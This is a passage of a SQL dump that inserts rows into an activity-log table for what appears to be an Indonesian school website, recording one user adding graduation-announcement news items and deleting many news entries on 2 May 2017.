INSERT INTO `tb_aktifitas` VALUES (235, 2, 'Menghapus berita ', '2017-05-02 11:35:05');
INSERT INTO `tb_aktifitas` VALUES (236, 2, 'Menghapus berita ', '2017-05-02 11:35:06');
INSERT INTO `tb_aktifitas` VALUES (237, 2, 'Menambah Berita \'Pengumuman Kelulusan Peserta Didik Tahun Ajaran 2016-2017\' ', '2017-05-02 11:35:55');
INSERT INTO `tb_aktifitas` VALUES (238, 2, 'Menambah Berita \'Pengumuman Kelulusan Peserta Didik Tahun Ajaran 2016-2017\' ', '2017-05-02 11:38:33');
INSERT INTO `tb_aktifitas` VALUES (239, 2, 'Menambah Berita \'Pengumuman Kelulusan Peserta Didik Tahun Ajaran 2016-2017\' ', '2017-05-02 11:41:20');
INSERT INTO `tb_aktifitas` VALUES (240, 2, 'Menambah Berita \'Pengumuman Kelulusan Peserta Didik Tahun Ajaran 2016-2017\' ', '2017-05-02 11:47:24');
INSERT INTO `tb_aktifitas` VALUES (241, 2, 'Menambah Berita \'Pengumuman KelulusanUjian Sekolah Berstandar Nasional dan Ujian Nasional Berbasis K', '2017-05-02 11:48:39');
INSERT INTO `tb_aktifitas` VALUES (242, 2, 'Menambah Berita \'Pengumuman Kelulusan Peserta Ujian Sekolah Berstandar Nasional dan Ujian Nasional B', '2017-05-02 11:50:18');
INSERT INTO `tb_aktifitas` VALUES (243, 2, 'Menghapus berita ', '2017-05-02 11:56:06');
INSERT INTO `tb_aktifitas` VALUES (244, 2, 'Menghapus berita ', '2017-05-02 11:56:06');
INSERT INTO `tb_aktifitas` VALUES (245, 2, 'Menghapus berita ', '2017-05-02 11:56:07');
INSERT INTO `tb_aktifitas` VALUES (246, 2, 'Menghapus berita ', '2017-05-02 11:56:08');
INSERT INTO `tb_aktifitas` VALUES (247, 2, 'Menghapus berita ', '2017-05-02 11:56:09');
INSERT INTO `tb_aktifitas` VALUES (248, 2, 'Mengubah Status berita ', '2017-05-02 11:56:21');
INSERT INTO `tb_aktifitas` VALUES (249, 2, 'Mengubah Status berita ', '2017-05-02 11:56:32');
INSERT INTO `tb_aktifitas` VALUES (250, 2, 'Menghapus berita ', '2017-05-02 11:56:42');
INSERT INTO `tb_aktifitas` VALUES (251, 2, 'Menghapus berita ', '2017-05-02 11:56:44');
INSERT INTO `tb_aktifitas` VALUES (252, 2, 'Menghapus berita ', '2017-05-02 11:56:52');
INSERT INTO `tb_aktifitas` VALUES (253, 2, 'Menghapus berita ', '2017-05-02 11:56:58');
INSERT INTO `tb_aktifitas` VALUES (254, 2, 'Menghapus berita ', '2017-05-02 11:56:59');
INSERT INTO `tb_aktifitas` VALUES (255, 2, 'Menghapus berita ', '2017-05-02 11:57:00');
INSERT INTO `tb_aktifitas` VALUES (256, 2, 'Menghapus berita ', '2017-05-02 11:57:01');
INSERT INTO `tb_aktifitas` VALUES (257, 2, 'Menghapus berita ', '2017-05-02 11:57:01');
INSERT INTO `tb_aktifitas` VALUES (258, 2, 'Menghapus berita ', '2017-05-02 11:57:06');
INSERT INTO `tb_aktifitas` VALUES (259, 2, 'Menghapus berita ', '2017-05-02 11:57:07');
INSERT INTO `tb_aktifitas` VALUES (260, 2, 'Menghapus berita ', '2017-05-02 11:57:07');
INSERT INTO `tb_aktifitas` VALUES (261, 2, 'Menghapus berita ', '2017-05-02 11:57:08');
INSERT INTO `tb_aktifitas` VALUES (262, 2, 'Menghapus berita ', '2017-05-02 11:57:09');
INSERT INTO `tb_aktifitas` VALUES (263, 2, 'Menghapus berita ', '2017-05-02 11:57:09');
INSERT INTO `tb_aktifitas` VALUES (264, 2, 'Menghapus berita ', '2017-05-02 11:57:10');
INSERT INTO `tb_aktifitas` VALUES (265, 2, 'Menghapus berita ', '2017-05-02 11:57:11');
INSERT INTO `tb_aktifitas` VALUES (266, 2, 'Menghapus berita ', '2017-05-02 11:57:17');
INSERT INTO `tb_aktifitas` VALUES (267, 2, 'Menghapus berita ', '2017-05-02 11:57:18');
INSERT INTO `tb_aktifitas` VALUES (268, 2, 'Menghapus berita ', '2017-05-02 11:57:19');
INSERT INTO `tb_aktifitas` VALUES (269, 2, 'Menghapus berita ', '2017-05-02 11:57:20');
INSERT INTO `tb_aktifitas` VALUES (270, 2, 'Menghapus berita ', '2017-05-02 11:57:20');
INSERT INTO `tb_aktifitas` VALUES (271, 2, 'Menghapus berita ', '2017-05-02 11:57:21');
INSERT INTO `tb_aktifitas` VALUES (272, 2, 'Menghapus berita ', '2017-05-02 11:57:22');
INSERT INTO `tb_aktifitas` VALUES (273, 2, 'Menghapus berita ', '2017-05-02 11:57:23');
INSERT INTO `tb_aktifitas` VALUES (274, 2, 'Menghapus berita ', '2017-05-02 11:57:23');
INSERT INTO `tb_aktifitas` VALUES (275, 2, 'Menghapus berita ', '2017-05-02 11:57:27');
INSERT INTO `tb_aktifitas` VALUES (276, 2, 'Menghapus berita ', '2017-05-02 11:57:28');
INSERT INTO `tb_aktifitas` VALUES (277, 2, 'Menghapus berita ', '2017-05-02 11:57:29');
INSERT INTO `tb_aktifitas` VALUES (278, 2, 'Menghapus berita ', '2017-05-02 11:57:30');
INSERT INTO `tb_aktifitas` VALUES (279, 2, 'Menghapus berita ', '2017-05-02 11:57:31');
INSERT INTO `tb_aktifitas` VALUES (280, 2, 'Menghapus berita ', '2017-05-02 11:57:32');
INSERT INTO `tb_aktifitas` VALUES (281, 2, 'Menghapus berita ', '2017-05-02 11:57:33');
INSERT INTO `tb_aktifitas` VALUES (282, 2, 'Menghapus berita ', '2017-05-02 11:57:34');
INSERT INTO `tb_aktifitas` VALUES (283, 2, 'Menghapus berita ', '2017-05-02 11:57:35');
INSERT INTO `tb_aktifitas` VALUES (284, 2, 'Menghapus berita ', '2017-05-02 11:57:35');
INSERT INTO `tb_aktifitas` VALUES (285, 2, 'Menghapus berita ', '2017-05-02 11:57:36');
INSERT INTO `tb_aktifitas` VALUES (286, 2, 'Menghapus berita ', '2017-05-02 11:57:37');
INSERT INTO `tb_aktifitas` VALUES (287, 2, 'Menghapus berita ', '2017-05-02 11:57:38');
INSERT INTO `tb_aktifitas` VALUES (288, 2, 'Menghapus berita ', '2017-05-02 11:57:39');
INSERT INTO `tb_aktifitas` VALUES (289, 2, 'Menghapus berita ', '2017-05-02 11:57:39');
INSERT INTO `tb_aktifitas` VALUES (290, 2, 'Menghapus berita ', '2017-05-02 11:57:40');
INSERT INTO `tb_aktifitas` VALUES (291, 2, 'Menghapus berita ', '2017-05-02 11:57:41');
INSERT INTO `tb_aktifitas` VALUES (292, 2, 'Menghapus berita ', '2017-05-02 11:57:42');
INSERT INTO `tb_aktifitas` VALUES (293, 2, 'Menghapus berita ', '2017-05-02 11:57:43');
INSERT INTO `tb_aktifitas` VALUES (294, 2, 'Menghapus berita ', '2017-05-02 11:57:43');
INSERT INTO `tb_aktifitas` VALUES (295, 2, 'Menghapus berita ', '2017-05-02 11:57:44');
INSERT INTO `tb_aktifitas` VALUES (296, 2, 'Menghapus berita ', '2017-05-02 11:57:45');
INSERT INTO `tb_aktifitas` VALUES (297, 2, 'Menghapus berita ', '2017-05-02 11:57:46');
INSERT INTO `tb_aktifitas` VALUES (298, 2, 'Menghapus berita ', '2017-05-02 11:57:47');
INSERT INTO `tb_aktifitas` VALUES (299, 2, 'Menghapus berita ', '2017-05-02 11:57:48');
INSERT INTO `tb_aktifitas` VALUES (300, 2, 'Menghapus berita ', '2017-05-02 11:57:48');
INSERT INTO `tb_aktifitas` VALUES (301, 2, 'Menghapus berita ', '2017-05-02 11:57:49');
INSERT INTO `tb_aktifitas` VALUES (302, 2, 'Menghapus berita ', '2017-05-02 11:57:50');
INSERT INTO `tb_aktifitas` VALUES (303, 2, 'Menghapus berita ', '2017-05-02 11:57:51');
INSERT INTO `tb_aktifitas` VALUES (304, 2, 'Menghapus berita ', '2017-05-02 11:57:51');
INSERT INTO `tb_aktifitas` VALUES (305, 2, 'Menghapus berita ', '2017-05-02 11:57:52');
INSERT INTO `tb_aktifitas` VALUES (306, 2, 'Menghapus berita ', '2017-05-02 11:57:53');
INSERT INTO `tb_aktifitas` VALUES (307, 2, 'Menghapus berita ', '2017-05-02 11:57:54');
INSERT INTO `tb_aktifitas` VALUES (308, 2, 'Menghapus berita ', '2017-05-02 11:57:55');
INSERT INTO `tb_aktifitas` VALUES (309, 2, 'Menghapus berita ', '2017-05-02 11:57:56');
INSERT INTO `tb_aktifitas` VALUES (310, 2, 'Menghapus berita ', '2017-05-02 11:57:56');
INSERT INTO `tb_aktifitas` VALUES (311, 2, 'Menghapus berita ', '2017-05-02 11:57:57');
INSERT INTO `tb_aktifitas` VALUES (312, 2, 'Menghapus berita ', '2017-05-02 11:57:58');
INSERT INTO `tb_aktifitas` VALUES (313, 2, 'Menghapus berita ', '2017-05-02 11:57:59');
INSERT INTO `tb_aktifitas` VALUES (314, 2, 'Menghapus berita ', '2017-05-02 11:58:00');
INSERT INTO `tb_aktifitas` VALUES (315, 2, 'Menghapus berita ', '2017-05-02 11:58:00');
INSERT INTO `tb_aktifitas` VALUES (316, 2, 'Menghapus berita ', '2017-05-02 11:58:02');
INSERT INTO `tb_aktifitas` VALUES (317, 2, 'Menghapus berita ', '2017-05-02 11:58:03');
INSERT INTO `tb_aktifitas` VALUES (318, 2, 'Menghapus berita ', '2017-05-02 11:58:04');
INSERT INTO `tb_aktifitas` VALUES (319, 2, 'Menghapus berita ', '2017-05-02 11:58:05');
INSERT INTO `tb_aktifitas` VALUES (320, 2, 'Menghapus berita ', '2017-05-02 11:58:05');
INSERT INTO `tb_aktifitas` VALUES (321, 2, 'Menghapus berita ', '2017-05-02 11:58:07');
INSERT INTO `tb_aktifitas` VALUES (322, 2, 'Menghapus berita ', '2017-05-02 11:58:07');
INSERT INTO `tb_aktifitas` VALUES (323, 2, 'Menghapus berita ', '2017-05-02 11:58:10');
INSERT INTO `tb_aktifitas` VALUES (324, 2, 'Menghapus berita ', '2017-05-02 11:58:11');
INSERT INTO `tb_aktifitas` VALUES (325, 2, 'Menghapus berita ', '2017-05-02 11:58:12');
INSERT INTO `tb_aktifitas` VALUES (326, 2, 'Menghapus berita ', '2017-05-02 11:58:13');
INSERT INTO `tb_aktifitas` VALUES (327, 2, 'Menghapus berita ', '2017-05-02 11:58:14');
INSERT INTO `tb_aktifitas` VALUES (328, 2, 'Menghapus berita ', '2017-05-02 11:58:15');
INSERT INTO `tb_aktifitas` VALUES (329, 2, 'Menghapus berita ', '2017-05-02 11:58:16');
INSERT INTO `tb_aktifitas` VALUES (330, 2, 'Menghapus berita ', '2017-05-02 11:58:17');
INSERT INTO `tb_aktifitas` VALUES (331, 2, 'Menghapus berita ', '2017-05-02 11:58:17');
INSERT INTO `tb_aktifitas` VALUES (332, 2, 'Menghapus berita ', '2017-05-02 11:58:18');
INSERT INTO `tb_aktifitas` VALUES (333, 2, 'Menghapus berita ', '2017-05-02 11:58:19');
INSERT INTO `tb_aktifitas` VALUES (334, 2, 'Menghapus berita ', '2017-05-02 11:58:21');
INSERT INTO `tb_aktifitas` VALUES (335, 2, 'Menghapus berita ', '2017-05-02 11:58:22');
INSERT INTO `tb_aktifitas` VALUES (336, 2, 'Menghapus berita ', '2017-05-02 11:58:23');
INSERT INTO `tb_aktifitas` VALUES (337, 2, 'Menghapus berita ', '2017-05-02 11:58:23');
INSERT INTO `tb_aktifitas` VALUES (338, 2, 'Menghapus berita ', '2017-05-02 11:58:24');
INSERT INTO `tb_aktifitas` VALUES (339, 2, 'Menghapus berita ', '2017-05-02 11:58:25');
INSERT INTO `tb_aktifitas` VALUES (340, 2, 'Menghapus berita ', '2017-05-02 11:58:26');
INSERT INTO `tb_aktifitas` VALUES (341, 2, 'Menghapus berita ', '2017-05-02 11:58:27');
INSERT INTO `tb_aktifitas` VALUES (342, 2, 'Menghapus berita ', '2017-05-02 11:58:28');
INSERT INTO `tb_aktifitas` VALUES (343, 2, 'Menghapus berita ', '2017-05-02 11:58:29');
INSERT INTO `tb_aktifitas` VALUES (344, 2, 'Menghapus berita ', '2017-05-02 11:58:30');
INSERT INTO `tb_aktifitas` VALUES (345, 2, 'Menghapus berita ', '2017-05-02 11:58:31');
INSERT INTO `tb_aktifitas` VALUES (346, 2, 'Menghapus berita ', '2017-05-02 11:58:31');
INSERT INTO `tb_aktifitas` VALUES (347, 2, 'Menghapus berita ', '2017-05-02 11:58:32');
INSERT INTO `tb_aktifitas` VALUES (348, 2, 'Menghapus berita ', '2017-05-02 11:58:33');
INSERT INTO `tb_aktifitas` VALUES (349, 2, 'Menghapus berita ', '2017-05-02 11:58:34');
INSERT INTO `tb_aktifitas` VALUES (350, 2, 'Menghapus berita ', '2017-05-02 11:58:34');
INSERT INTO `tb_aktifitas` VALUES (351, 2, 'Menghapus berita ', '2017-05-02 11:58:35');
INSERT INTO `tb_aktifitas` VALUES (352, 2, 'Menghapus berita ', '2017-05-02 11:58:36');
INSERT INTO `tb_aktifitas` VALUES (353, 2, 'Menghapus berita ', '2017-05-02 11:58:37');
INSERT INTO `tb_aktifitas` VALUES (354, 2, 'Menghapus berita ', '2017-05-02 11:58:38');
INSERT INTO `tb_aktifitas` VALUES (355, 2, 'Menghapus berita ', '2017-05-02 11:58:39');
INSERT INTO `tb_aktifitas` VALUES (356, 2, 'Menghapus berita ', '2017-05-02 11:58:42');
INSERT INTO `tb_aktifitas` VALUES (357, 2, 'Menghapus berita ', '2017-05-02 11:58:43');
INSERT INTO `tb_aktifitas` VALUES (358, 2, 'Menghapus berita ', '2017-05-02 11:58:43');
INSERT INTO `tb_aktifitas` VALUES (359, 2, 'Menghapus berita ', '2017-05-02 11:58:44');
INSERT INTO `tb_aktifitas` VALUES (360, 2, 'Menghapus berita ', '2017-05-02 11:58:45');
INSERT INTO `tb_aktifitas` VALUES (361, 2, 'Menghapus berita ', '2017-05-02 11:58:46');
INSERT INTO `tb_aktifitas` VALUES (362, 2, 'Menghapus berita ', '2017-05-02 11:58:47');
INSERT INTO `tb_aktifitas` VALUES (363, 2, 'Menghapus berita ', '2017-05-02 11:58:48');
INSERT INTO `tb_aktifitas` VALUES (364, 2, 'Menghapus berita ', '2017-05-02 11:58:49');
INSERT INTO `tb_aktifitas` VALUES (365, 2, 'Menghapus berita ', '2017-05-02 11:58:50');
INSERT INTO `tb_aktifitas` VALUES (366, 2, 'Menghapus berita ', '2017-05-02 11:58:50');
INSERT INTO `tb_aktifitas` VALUES (367, 2, 'Menghapus berita ', '2017-05-02 11:58:51');
INSERT INTO `tb_aktifitas` VALUES (368, 2, 'Menghapus berita ', '2017-05-02 11:58:52');
INSERT INTO `tb_aktifitas` VALUES (369, 2, 'Menghapus berita ', '2017-05-02 11:58:53');
INSERT INTO `tb_aktifitas` VALUES (370, 2, 'Menghapus berita ', '2017-05-02 11:58:54');
INSERT INTO `tb_aktifitas` VALUES (371, 2, 'Menghapus berita ', '2017-05-02 11:58:56');
INSERT INTO `tb_aktifitas` VALUES (372, 2, 'Menghapus berita ', '2017-05-02 11:59:00');
INSERT INTO `tb_aktifitas` VALUES (373, 2, 'Menghapus berita ', '2017-05-02 11:59:01');
INSERT INTO `tb_aktifitas` VALUES (374, 2, 'Menghapus berita ', '2017-05-02 11:59:02');
INSERT INTO `tb_aktifitas` VALUES (375, 2, 'Menghapus berita ', '2017-05-02 11:59:04');
INSERT INTO `tb_aktifitas` VALUES (376, 2, 'Menghapus berita ', '2017-05-02 11:59:05');
INSERT INTO `tb_aktifitas` VALUES (377, 2, 'Menghapus berita ', '2017-05-02 11:59:05');
INSERT INTO `tb_aktifitas` VALUES (378, 2, 'Menghapus berita ', '2017-05-02 11:59:06');
INSERT INTO `tb_aktifitas` VALUES (379, 2, 'Menghapus berita ', '2017-05-02 11:59:09');
INSERT INTO `tb_aktifitas` VALUES (380, 2, 'Menghapus berita ', '2017-05-02 11:59:10');
INSERT INTO `tb_aktifitas` VALUES (381, 2, 'Menghapus berita ', '2017-05-02 11:59:12');
INSERT INTO `tb_aktifitas` VALUES (382, 2, 'Menghapus berita ', '2017-05-02 11:59:13');
INSERT INTO `tb_aktifitas` VALUES (383, 2, 'Menghapus berita ', '2017-05-02 11:59:15');
INSERT INTO `tb_aktifitas` VALUES (384, 2, 'Menghapus berita ', '2017-05-02 11:59:17');
INSERT INTO `tb_aktifitas` VALUES (385, 2, 'Menghapus berita ', '2017-05-02 11:59:18');
INSERT INTO `tb_aktifitas` VALUES (386, 2, 'Menghapus berita ', '2017-05-02 11:59:20');
INSERT INTO `tb_aktifitas` VALUES (387, 2, 'Menghapus berita ', '2017-05-02 11:59:21');
INSERT INTO `tb_aktifitas` VALUES (388, 2, 'Menghapus berita ', '2017-05-02 11:59:23');
INSERT INTO `tb_aktifitas` VALUES (389, 2, 'Menghapus berita ', '2017-05-02 11:59:24');
INSERT INTO `tb_aktifitas` VALUES (390, 2, 'Menghapus berita ', '2017-05-02 11:59:25');
INSERT INTO `tb_aktifitas` VALUES (391, 2, 'Menghapus berita ', '2017-05-02 11:59:26');
INSERT INTO `tb_aktifitas` VALUES (392, 2, 'Menghapus berita ', '2017-05-02 11:59:27');
INSERT INTO `tb_aktifitas` VALUES (393, 2, 'Menghapus berita ', '2017-05-02 11:59:28');
INSERT INTO `tb_aktifitas` VALUES (394, 2, 'Menghapus berita ', '2017-05-02 11:59:29');
INSERT INTO `tb_aktifitas` VALUES (395, 2, 'Menghapus berita ', '2017-05-02 11:59:30');
INSERT INTO `tb_aktifitas` VALUES (396, 2, 'Menghapus berita ', '2017-05-02 11:59:31');
INSERT INTO `tb_aktifitas` VALUES (397, 2, 'Menghapus berita ', '2017-05-02 11:59:32');
INSERT INTO `tb_aktifitas` VALUES (398, 2, 'Menghapus berita ', '2017-05-02 11:59:45');
INSERT INTO `tb_aktifitas` VALUES (399, 2, 'Menghapus berita ', '2017-05-02 11:59:47');
INSERT INTO `tb_aktifitas` VALUES (400, 2, 'Menghapus berita ', '2017-05-02 11:59:48');
INSERT INTO `tb_aktifitas` VALUES (401, 2, 'Menghapus berita ', '2017-05-02 11:59:49');
INSERT INTO `tb_aktifitas` VALUES (402, 2, 'Menghapus berita ', '2017-05-02 11:59:50');
INSERT INTO `tb_aktifitas` VALUES (403, 2, 'Menghapus berita ', '2017-05-02 11:59:52');
INSERT INTO `tb_aktifitas` VALUES (404, 2, 'Menghapus berita ', '2017-05-02 11:59:53');
INSERT INTO `tb_aktifitas` VALUES (405, 2, 'Menghapus berita ', '2017-05-02 11:59:54');
INSERT INTO `tb_aktifitas` VALUES (406, 2, 'Menghapus berita ', '2017-05-02 11:59:56');
INSERT INTO `tb_aktifitas` VALUES (407, 2, 'Menghapus berita ', '2017-05-02 11:59:57');
INSERT INTO `tb_aktifitas` VALUES (408, 2, 'Menghapus berita ', '2017-05-02 11:59:57');
INSERT INTO `tb_aktifitas` VALUES (409, 2, 'Menghapus berita ', '2017-05-02 11:59:58');
INSERT INTO `tb_aktifitas` VALUES (410, 2, 'Menghapus berita ', '2017-05-02 11:59:59');
INSERT INTO `tb_aktifitas` VALUES (411, 2, 'Menghapus berita ', '2017-05-02 12:00:00');
INSERT INTO `tb_aktifitas` VALUES (412, 2, 'Menghapus berita ', '2017-05-02 12:00:01');
INSERT INTO `tb_aktifitas` VALUES (413, 2, 'Menghapus berita ', '2017-05-02 12:00:02');
INSERT INTO `tb_aktifitas` VALUES (414, 2, 'Menghapus berita ', '2017-05-02 12:00:03');
INSERT INTO `tb_aktifitas` VALUES (415, 2, 'Menghapus berita ', '2017-05-02 12:00:05');
INSERT INTO `tb_aktifitas` VALUES (416, 2, 'Menghapus berita ', '2017-05-02 12:00:05');
INSERT INTO `tb_aktifitas` VALUES (417, 2, 'Menghapus berita ', '2017-05-02 12:00:06');
INSERT INTO `tb_aktifitas` VALUES (418, 2, 'Menghapus berita ', '2017-05-02 12:00:07');
INSERT INTO `tb_aktifitas` VALUES (419, 2, 'Menghapus berita ', '2017-05-02 12:00:08');
INSERT INTO `tb_aktifitas` VALUES (420, 2, 'Menghapus berita ', '2017-05-02 12:00:09');
INSERT INTO `tb_aktifitas` VALUES (421, 2, 'Menghapus berita ', '2017-05-02 12:00:10');
INSERT INTO `tb_aktifitas` VALUES (422, 2, 'Menghapus berita ', '2017-05-02 12:00:11');
INSERT INTO `tb_aktifitas` VALUES (423, 2, 'Menghapus berita ', '2017-05-02 12:00:11');
INSERT INTO `tb_aktifitas` VALUES (424, 2, 'Menghapus berita ', '2017-05-02 12:00:13');
INSERT INTO `tb_aktifitas` VALUES (425, 2, 'Menghapus berita ', '2017-05-02 12:00:14');
INSERT INTO `tb_aktifitas` VALUES (426, 2, 'Menghapus berita ', '2017-05-02 12:00:15');
INSERT INTO `tb_aktifitas` VALUES (427, 2, 'Menghapus berita ', '2017-05-02 12:00:16');
INSERT INTO `tb_aktifitas` VALUES (428, 2, 'Menghapus berita ', '2017-05-02 12:00:16');
INSERT INTO `tb_aktifitas` VALUES (429, 2, 'Menghapus berita ', '2017-05-02 12:00:38');
INSERT INTO `tb_aktifitas` VALUES (430, 2, 'Menghapus berita ', '2017-05-02 12:00:39');
INSERT INTO `tb_aktifitas` VALUES (431, 2, 'Menghapus berita ', '2017-05-02 12:00:40');
INSERT INTO `tb_aktifitas` VALUES (432, 2, 'Menghapus berita ', '2017-05-02 12:00:40');
INSERT INTO `tb_aktifitas` VALUES (433, 2, 'Menghapus berita ', '2017-05-02 12:00:41');
INSERT INTO `tb_aktifitas` VALUES (434, 2, 'Menghapus berita ', '2017-05-02 12:00:42');
INSERT INTO `tb_aktifitas` VALUES (435, 2, 'Menghapus berita ', '2017-05-02 12:00:51');
INSERT INTO `tb_aktifitas` VALUES (436, 2, 'Menghapus berita ', '2017-05-02 12:00:52');
INSERT INTO `tb_aktifitas` VALUES (437, 2, 'Menghapus berita ', '2017-05-02 12:00:53');
INSERT INTO `tb_aktifitas` VALUES (438, 2, 'Menghapus berita ', '2017-05-02 12:00:54');
INSERT INTO `tb_aktifitas` VALUES (439, 2, 'Menghapus berita ', '2017-05-02 12:00:56');
INSERT INTO `tb_aktifitas` VALUES (440, 2, 'Menghapus berita ', '2017-05-02 12:00:57');
INSERT INTO `tb_aktifitas` VALUES (441, 2, 'Menghapus berita ', '2017-05-02 12:00:58');
INSERT INTO `tb_aktifitas` VALUES (442, 2, 'Menghapus berita ', '2017-05-02 12:00:59');
INSERT INTO `tb_aktifitas` VALUES (443, 2, 'Menghapus berita ', '2017-05-02 12:01:00');
INSERT INTO `tb_aktifitas` VALUES (444, 2, 'Menghapus berita ', '2017-05-02 12:01:01');
INSERT INTO `tb_aktifitas` VALUES (445, 2, 'Menghapus berita ', '2017-05-02 12:01:03');
INSERT INTO `tb_aktifitas` VALUES (446, 2, 'Menghapus berita ', '2017-05-02 12:01:04');
INSERT INTO `tb_aktifitas` VALUES (447, 2, 'Menghapus berita ', '2017-05-02 12:01:06');
INSERT INTO `tb_aktifitas` VALUES (448, 2, 'Menghapus berita ', '2017-05-02 12:01:07');
INSERT INTO `tb_aktifitas` VALUES (449, 2, 'Menghapus berita ', '2017-05-02 12:01:09');
INSERT INTO `tb_aktifitas` VALUES (450, 2, 'Menghapus berita ', '2017-05-02 12:01:12');
INSERT INTO `tb_aktifitas` VALUES (451, 2, 'Menghapus berita ', '2017-05-02 12:01:14');
INSERT INTO `tb_aktifitas` VALUES (452, 2, 'Menghapus berita ', '2017-05-02 12:01:16');
INSERT INTO `tb_aktifitas` VALUES (453, 2, 'Menghapus berita ', '2017-05-02 12:01:24');
INSERT INTO `tb_aktifitas` VALUES (454, 2, 'Menghapus berita ', '2017-05-02 12:01:27');
INSERT INTO `tb_aktifitas` VALUES (455, 2, 'Menghapus berita ', '2017-05-02 12:01:28');
INSERT INTO `tb_aktifitas` VALUES (456, 2, 'Menghapus berita ', '2017-05-02 12:01:32');
INSERT INTO `tb_aktifitas` VALUES (457, 2, 'Menghapus berita ', '2017-05-02 12:01:33');
INSERT INTO `tb_aktifitas` VALUES (458, 2, 'Menghapus berita ', '2017-05-02 12:01:34');
INSERT INTO `tb_aktifitas` VALUES (459, 2, 'Menghapus berita ', '2017-05-02 12:01:35');
INSERT INTO `tb_aktifitas` VALUES (460, 2, 'Menghapus berita ', '2017-05-02 12:01:35');
INSERT INTO `tb_aktifitas` VALUES (461, 2, 'Menghapus berita ', '2017-05-02 12:01:37');
INSERT INTO `tb_aktifitas` VALUES (462, 2, 'Menghapus berita ', '2017-05-02 12:01:39');
INSERT INTO `tb_aktifitas` VALUES (463, 2, 'Menghapus berita ', '2017-05-02 12:01:40');
INSERT INTO `tb_aktifitas` VALUES (464, 2, 'Menghapus berita ', '2017-05-02 12:01:41');
INSERT INTO `tb_aktifitas` VALUES (465, 2, 'Menghapus berita ', '2017-05-02 12:01:43');
INSERT INTO `tb_aktifitas` VALUES (466, 2, 'Menghapus berita ', '2017-05-02 12:01:44');
INSERT INTO `tb_aktifitas` VALUES (467, 2, 'Menghapus berita ', '2017-05-02 12:01:45');
INSERT INTO `tb_aktifitas` VALUES (468, 2, 'Menghapus berita ', '2017-05-02 12:01:47');
INSERT INTO `tb_aktifitas` VALUES (469, 2, 'Menghapus berita ', '2017-05-02 12:01:49');
INSERT INTO `tb_aktifitas` VALUES (470, 2, 'Menghapus berita ', '2017-05-02 12:01:55');
INSERT INTO `tb_aktifitas` VALUES (471, 2, 'Menghapus berita ', '2017-05-02 12:01:55');
INSERT INTO `tb_aktifitas` VALUES (472, 2, 'Menghapus berita ', '2017-05-02 12:01:56');
INSERT INTO `tb_aktifitas` VALUES (473, 2, 'Menghapus berita ', '2017-05-02 12:01:57');
INSERT INTO `tb_aktifitas` VALUES (474, 2, 'Menghapus berita ', '2017-05-02 12:01:58');
INSERT INTO `tb_aktifitas` VALUES (475, 2, 'Menghapus berita ', '2017-05-02 12:01:59');
INSERT INTO `tb_aktifitas` VALUES (476, 2, 'Menghapus berita ', '2017-05-02 12:01:59');
INSERT INTO `tb_aktifitas` VALUES (477, 2, 'Menghapus berita ', '2017-05-02 12:02:00');
INSERT INTO `tb_aktifitas` VALUES (478, 2, 'Menghapus berita ', '2017-05-02 12:02:01');
INSERT INTO `tb_aktifitas` VALUES (479, 2, 'Menghapus berita ', '2017-05-02 12:02:02');
INSERT INTO `tb_aktifitas` VALUES (480, 2, 'Menghapus berita ', '2017-05-02 12:02:04');
INSERT INTO `tb_aktifitas` VALUES (481, 2, 'Menghapus berita ', '2017-05-02 12:02:04');
INSERT INTO `tb_aktifitas` VALUES (482, 2, 'Menghapus berita ', '2017-05-02 12:02:05');
INSERT INTO `tb_aktifitas` VALUES (483, 2, 'Menghapus berita ', '2017-05-02 12:02:06');
INSERT INTO `tb_aktifitas` VALUES (484, 2, 'Menghapus berita ', '2017-05-02 12:02:07');
INSERT INTO `tb_aktifitas` VALUES (485, 2, 'Menghapus berita ', '2017-05-02 12:02:10');
INSERT INTO `tb_aktifitas` VALUES (486, 2, 'Menghapus berita ', '2017-05-02 12:02:10');
INSERT INTO `tb_aktifitas` VALUES (487, 2, 'Menghapus berita ', '2017-05-02 12:02:12');
INSERT INTO `tb_aktifitas` VALUES (488, 2, 'Menghapus berita ', '2017-05-02 12:02:12');
INSERT INTO `tb_aktifitas` VALUES (489, 2, 'Menghapus berita ', '2017-05-02 12:02:16');
INSERT INTO `tb_aktifitas` VALUES (490, 2, 'Menghapus berita ', '2017-05-02 12:02:20');
INSERT INTO `tb_aktifitas` VALUES (491, 2, 'Menghapus berita ', '2017-05-02 12:02:21');
INSERT INTO `tb_aktifitas` VALUES (492, 2, 'Menghapus berita ', '2017-05-02 12:02:50');
INSERT INTO `tb_aktifitas` VALUES (493, 2, 'Menghapus berita ', '2017-05-02 12:02:51');
INSERT INTO `tb_aktifitas` VALUES (494, 2, 'Menghapus berita ', '2017-05-02 12:02:52');
INSERT INTO `tb_aktifitas` VALUES (495, 2, 'Menghapus berita ', '2017-05-02 12:02:52');
INSERT INTO `tb_aktifitas` VALUES (496, 2, 'Menghapus berita ', '2017-05-02 12:02:55');
INSERT INTO `tb_aktifitas` VALUES (497, 2, 'Menghapus berita ', '2017-05-02 12:02:56');
INSERT INTO `tb_aktifitas` VALUES (498, 2, 'Menghapus berita ', '2017-05-02 12:02:58');
INSERT INTO `tb_aktifitas` VALUES (499, 2, 'Menghapus berita ', '2017-05-02 12:02:59');
INSERT INTO `tb_aktifitas` VALUES (500, 2, 'Menghapus berita ', '2017-05-02 12:03:21');
INSERT INTO `tb_aktifitas` VALUES (501, 2, 'Menghapus berita ', '2017-05-02 12:03:22');
INSERT INTO `tb_aktifitas` VALUES (502, 2, 'Menghapus berita ', '2017-05-02 12:03:23');
INSERT INTO `tb_aktifitas` VALUES (503, 2, 'Menghapus berita ', '2017-05-02 12:03:25');
INSERT INTO `tb_aktifitas` VALUES (504, 2, 'Menghapus berita ', '2017-05-02 12:03:26');
INSERT INTO `tb_aktifitas` VALUES (505, 2, 'Menghapus berita ', '2017-05-02 12:03:28');
INSERT INTO `tb_aktifitas` VALUES (506, 2, 'Menghapus berita ', '2017-05-02 12:03:29');
INSERT INTO `tb_aktifitas` VALUES (507, 2, 'Menghapus berita ', '2017-05-02 12:03:30');
INSERT INTO `tb_aktifitas` VALUES (508, 2, 'Menghapus berita ', '2017-05-02 12:03:30');
INSERT INTO `tb_aktifitas` VALUES (509, 2, 'Menghapus berita ', '2017-05-02 12:03:31');
INSERT INTO `tb_aktifitas` VALUES (510, 2, 'Menghapus berita ', '2017-05-02 12:03:32');
INSERT INTO `tb_aktifitas` VALUES (511, 2, 'Menghapus berita ', '2017-05-02 12:03:33');
INSERT INTO `tb_aktifitas` VALUES (512, 2, 'Menghapus berita ', '2017-05-02 12:03:34');
